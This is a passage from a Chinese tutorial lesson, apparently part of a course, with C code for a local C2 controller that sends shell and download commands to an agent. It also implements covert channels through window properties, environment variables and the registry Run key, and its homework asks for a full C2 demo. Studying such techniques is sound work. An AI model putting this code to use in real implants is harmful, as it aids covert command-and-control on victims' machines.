+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"  download &#x3C;f> - Download file</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"  exit         - Exit agent</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"  quit         - Quit controller</span><span style="color:#79B8FF">\n\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 启动接收线程</span></span>
+<span class="line"><span style="color:#E1E4E8">    HANDLE hRecv </span><span style="color:#F97583">=</span><span style="color:#B392F0"> CreateThread</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span></span>
+<span class="line"><span style="color:#E1E4E8">        (LPTHREAD_START_ROUTINE)Controller_ReceiveLoop, pCtx, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    char</span><span style="color:#FFAB70"> input</span><span style="color:#E1E4E8">[</span><span style="color:#79B8FF">1024</span><span style="color:#E1E4E8">];</span></span>
+<span class="line"><span style="color:#F97583">    while</span><span style="color:#E1E4E8"> (pCtx->bRunning) {</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"> "</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">fgets</span><span style="color:#E1E4E8">(input, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(input), stdin)) </span><span style="color:#F97583">break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#FFAB70">        input</span><span style="color:#E1E4E8">[</span><span style="color:#B392F0">strcspn</span><span style="color:#E1E4E8">(input, </span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">)] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">strncmp</span><span style="color:#E1E4E8">(input, </span><span style="color:#9ECBFF">"shell "</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#B392F0">            Controller_SendCommand</span><span style="color:#E1E4E8">(pCtx, CMD_SHELL, input </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 6</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#F97583">        else</span><span style="color:#F97583"> if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">strncmp</span><span style="color:#E1E4E8">(input, </span><span style="color:#9ECBFF">"download "</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">9</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#B392F0">            Controller_SendCommand</span><span style="color:#E1E4E8">(pCtx, CMD_DOWNLOAD, input </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 9</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#F97583">        else</span><span style="color:#F97583"> if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">strcmp</span><span style="color:#E1E4E8">(input, </span><span style="color:#9ECBFF">"exit"</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#B392F0">            Controller_SendCommand</span><span style="color:#E1E4E8">(pCtx, CMD_EXIT, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#F97583">        else</span><span style="color:#F97583"> if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">strcmp</span><span style="color:#E1E4E8">(input, </span><span style="color:#9ECBFF">"quit"</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">            pCtx->bRunning </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> FALSE</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#B392F0">    WaitForSingleObject</span><span style="color:#E1E4E8">(hRecv, </span><span style="color:#79B8FF">1000</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    for</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">int</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">; i </span><span style="color:#F97583">&#x3C;</span><span style="color:#79B8FF"> 4</span><span style="color:#E1E4E8">; i</span><span style="color:#F97583">++</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (pCtx->Channels[i])</span></span>
+<span class="line"><span style="color:#B392F0">            IPC_DestroyChannel</span><span style="color:#E1E4E8">(pCtx->Channels[i]);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#B392F0">    free</span><span style="color:#E1E4E8">(pCtx);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span></code></pre><h3 id="section-12">项目4：隐蔽通道通信</h3><pre class="shiki github-dark" style="background-color:#24292e;color:#e1e4e8" tabindex="0"><code><span class="line"><span style="color:#6A737D">// CovertChannel.c - 隐蔽通道实现</span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;windows.h></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;stdio.h></span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 使用窗口属性作为隐蔽通道</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> PROP_NAME</span><span style="color:#9ECBFF"> "CovertData"</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">BOOL </span><span style="color:#B392F0">CovertSend_WindowProp</span><span style="color:#E1E4E8">(HWND </span><span style="color:#FFAB70">hTargetWnd</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">const</span><span style="color:#F97583"> void*</span><span style="color:#FFAB70"> data</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">size_t</span><span style="color:#FFAB70"> size</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#6A737D">    // 分配全局内存</span></span>
+<span class="line"><span style="color:#E1E4E8">    HGLOBAL hGlobal </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GlobalAlloc</span><span style="color:#E1E4E8">(GHND, size </span><span style="color:#F97583">+</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(DWORD));</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">hGlobal) </span><span style="color:#F97583">return</span><span style="color:#79B8FF"> FALSE</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#E1E4E8">    LPVOID pMem </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GlobalLock</span><span style="color:#E1E4E8">(hGlobal);</span></span>
+<span class="line"><span style="color:#F97583">    *</span><span style="color:#E1E4E8">(DWORD</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)pMem </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (DWORD)size;</span></span>
+<span class="line"><span style="color:#B392F0">    memcpy</span><span style="color:#E1E4E8">((BYTE</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)pMem </span><span style="color:#F97583">+</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(DWORD), data, size);</span></span>
+<span class="line"><span style="color:#B392F0">    GlobalUnlock</span><span style="color:#E1E4E8">(hGlobal);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 设置窗口属性</span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#B392F0"> SetPropA</span><span style="color:#E1E4E8">(hTargetWnd, PROP_NAME, hGlobal);</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">BOOL </span><span style="color:#B392F0">CovertRecv_WindowProp</span><span style="color:#E1E4E8">(HWND </span><span style="color:#FFAB70">hWnd</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">void*</span><span style="color:#FFAB70"> buffer</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">size_t*</span><span style="color:#FFAB70"> pSize</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">    HGLOBAL hGlobal </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (HGLOBAL)</span><span style="color:#B392F0">GetPropA</span><span style="color:#E1E4E8">(hWnd, PROP_NAME);</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">hGlobal) </span><span style="color:#F97583">return</span><span style="color:#79B8FF"> FALSE</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#E1E4E8">    LPVOID pMem </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GlobalLock</span><span style="color:#E1E4E8">(hGlobal);</span></span>
+<span class="line"><span style="color:#E1E4E8">    DWORD dwSize </span><span style="color:#F97583">=</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8">(DWORD</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)pMem;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">pSize </span><span style="color:#F97583">&#x3C;</span><span style="color:#E1E4E8"> dwSize) {</span></span>
+<span class="line"><span style="color:#B392F0">        GlobalUnlock</span><span style="color:#E1E4E8">(hGlobal);</span></span>
+<span class="line"><span style="color:#F97583">        *</span><span style="color:#E1E4E8">pSize </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> dwSize;</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> FALSE</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#B392F0">    memcpy</span><span style="color:#E1E4E8">(buffer, (BYTE</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)pMem </span><span style="color:#F97583">+</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(DWORD), dwSize);</span></span>
+<span class="line"><span style="color:#F97583">    *</span><span style="color:#E1E4E8">pSize </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> dwSize;</span></span>
+<span class="line"><span style="color:#B392F0">    GlobalUnlock</span><span style="color:#E1E4E8">(hGlobal);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 清理</span></span>
+<span class="line"><span style="color:#B392F0">    RemovePropA</span><span style="color:#E1E4E8">(hWnd, PROP_NAME);</span></span>
+<span class="line"><span style="color:#B392F0">    GlobalFree</span><span style="color:#E1E4E8">(hGlobal);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#79B8FF"> TRUE</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 使用环境变量作为隐蔽通道</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> ENV_VAR_NAME</span><span style="color:#9ECBFF"> "COVERT_DATA"</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">BOOL </span><span style="color:#B392F0">CovertSend_EnvVar</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> data</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#B392F0"> SetEnvironmentVariableA</span><span style="color:#E1E4E8">(ENV_VAR_NAME, data);</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">BOOL </span><span style="color:#B392F0">CovertRecv_EnvVar</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">char*</span><span style="color:#FFAB70"> buffer</span><span style="color:#E1E4E8">, DWORD </span><span style="color:#FFAB70">size</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">    DWORD ret </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GetEnvironmentVariableA</span><span style="color:#E1E4E8">(ENV_VAR_NAME, buffer, size);</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (ret </span><span style="color:#F97583">></span><span style="color:#79B8FF"> 0</span><span style="color:#F97583"> &#x26;&#x26;</span><span style="color:#E1E4E8"> ret </span><span style="color:#F97583">&#x3C;</span><span style="color:#E1E4E8"> size) {</span></span>
+<span class="line"><span style="color:#B392F0">        SetEnvironmentVariableA</span><span style="color:#E1E4E8">(ENV_VAR_NAME, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span><span style="color:#6A737D">  // 清除</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> TRUE</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#79B8FF"> FALSE</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 使用注册表作为隐蔽通道</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> REG_COVERT_PATH</span><span style="color:#9ECBFF"> "Software</span><span style="color:#79B8FF">\\</span><span style="color:#9ECBFF">Microsoft</span><span style="color:#79B8FF">\\</span><span style="color:#9ECBFF">Windows</span><span style="color:#79B8FF">\\</span><span style="color:#9ECBFF">CurrentVersion</span><span style="color:#79B8FF">\\</span><span style="color:#9ECBFF">Run"</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> REG_COVERT_VALUE</span><span style="color:#9ECBFF"> "CovertData"</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">BOOL </span><span style="color:#B392F0">CovertSend_Registry</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">const</span><span style="color:#F97583"> void*</span><span style="color:#FFAB70"> data</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">size_t</span><span style="color:#FFAB70"> size</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">    HKEY hKey;</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">RegOpenKeyExA</span><span style="color:#E1E4E8">(HKEY_CURRENT_USER, REG_COVERT_PATH, </span></span>
+<span class="line"><span style="color:#79B8FF">            0</span><span style="color:#E1E4E8">, KEY_WRITE, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">hKey) </span><span style="color:#F97583">!=</span><span style="color:#E1E4E8"> ERROR_SUCCESS) {</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> FALSE</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#E1E4E8">    BOOL bResult </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">RegSetValueExA</span><span style="color:#E1E4E8">(hKey, REG_COVERT_VALUE, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span></span>
+<span class="line"><span style="color:#E1E4E8">        REG_BINARY, (BYTE</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)data, (DWORD)size) </span><span style="color:#F97583">==</span><span style="color:#E1E4E8"> ERROR_SUCCESS);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#B392F0">    RegCloseKey</span><span style="color:#E1E4E8">(hKey);</span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#E1E4E8"> bResult;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">BOOL </span><span style="color:#B392F0">CovertRecv_Registry</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">void*</span><span style="color:#FFAB70"> buffer</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">size_t*</span><span style="color:#FFAB70"> pSize</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">    HKEY hKey;</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">RegOpenKeyExA</span><span style="color:#E1E4E8">(HKEY_CURRENT_USER, REG_COVERT_PATH,</span></span>
+<span class="line"><span style="color:#79B8FF">            0</span><span style="color:#E1E4E8">, KEY_READ </span><span style="color:#F97583">|</span><span style="color:#E1E4E8"> KEY_WRITE, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">hKey) </span><span style="color:#F97583">!=</span><span style="color:#E1E4E8"> ERROR_SUCCESS) {</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> FALSE</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#E1E4E8">    DWORD dwType, dwSize </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (DWORD)</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">pSize;</span></span>
+<span class="line"><span style="color:#E1E4E8">    BOOL bResult </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">RegQueryValueExA</span><span style="color:#E1E4E8">(hKey, REG_COVERT_VALUE, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#F97583">        &#x26;</span><span style="color:#E1E4E8">dwType, (BYTE</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)buffer, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">dwSize) </span><span style="color:#F97583">==</span><span style="color:#E1E4E8"> ERROR_SUCCESS);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (bResult) {</span></span>
+<span class="line"><span style="color:#F97583">        *</span><span style="color:#E1E4E8">pSize </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> dwSize;</span></span>
+<span class="line"><span style="color:#B392F0">        RegDeleteValueA</span><span style="color:#E1E4E8">(hKey, REG_COVERT_VALUE);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#B392F0">    RegCloseKey</span><span style="color:#E1E4E8">(hKey);</span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#E1E4E8"> bResult;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 测试隐蔽通道</span></span>
+<span class="line"><span style="color:#F97583">int</span><span style="color:#B392F0"> main</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"=== Covert Channel Test ===</span><span style="color:#79B8FF">\n\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 测试环境变量通道</span></span>
+<span class="line"><span style="color:#F97583">    const</span><span style="color:#F97583"> char*</span><span style="color:#E1E4E8"> testData </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "Secret Command"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#B392F0">    CovertSend_EnvVar</span><span style="color:#E1E4E8">(testData);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    char</span><span style="color:#FFAB70"> recvBuf</span><span style="color:#E1E4E8">[</span><span style="color:#79B8FF">256</span><span style="color:#E1E4E8">];</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">CovertRecv_EnvVar</span><span style="color:#E1E4E8">(recvBuf, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(recvBuf))) {</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[EnvVar] Received: </span><span style="color:#79B8FF">%s\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, recvBuf);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 测试注册表通道</span></span>
+<span class="line"><span style="color:#E1E4E8">    BYTE binData</span><span style="color:#F97583">[]</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> {</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">DE</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">AD</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">BE</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">EF</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">01</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">02</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">03</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">04</span><span style="color:#E1E4E8">};</span></span>
+<span class="line"><span style="color:#B392F0">    CovertSend_Registry</span><span style="color:#E1E4E8">(binData, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(binData));</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#E1E4E8">    BYTE </span><span style="color:#FFAB70">recvBin</span><span style="color:#E1E4E8">[</span><span style="color:#79B8FF">256</span><span style="color:#E1E4E8">];</span></span>
+<span class="line"><span style="color:#F97583">    size_t</span><span style="color:#E1E4E8"> recvSize </span><span style="color:#F97583">=</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(recvBin);</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">CovertRecv_Registry</span><span style="color:#E1E4E8">(recvBin, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">recvSize)) {</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[Registry] Received </span><span style="color:#79B8FF">%zu</span><span style="color:#9ECBFF"> bytes: "</span><span style="color:#E1E4E8">, recvSize);</span></span>
+<span class="line"><span style="color:#F97583">        for</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">size_t</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">; i </span><span style="color:#F97583">&#x3C;</span><span style="color:#E1E4E8"> recvSize; i</span><span style="color:#F97583">++</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#B392F0">            printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">%02X</span><span style="color:#9ECBFF"> "</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">recvBin</span><span style="color:#E1E4E8">[i]);</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span></code></pre><hr><h2 id="section-13">课后作业</h2><ol><li>完善IPC库，添加WM_COPYDATA和剪切板通道支持</li><li>实现通道自动切换和故障恢复机制</li><li>为通信数据添加加密和完整性校验</li><li>实现一个完整的本地C2通信演示系统</li><li>研究并实现更多隐蔽通道（如文件时间戳、ADS等）</li></ol><hr><h2 id="section-14">扩展阅读</h2><ul><li>Windows IPC机制深度解析</li><li>隐蔽通道技术研究</li><li>进程间通信安全性分析</li><li>C2框架通信设计模式</li></ul>
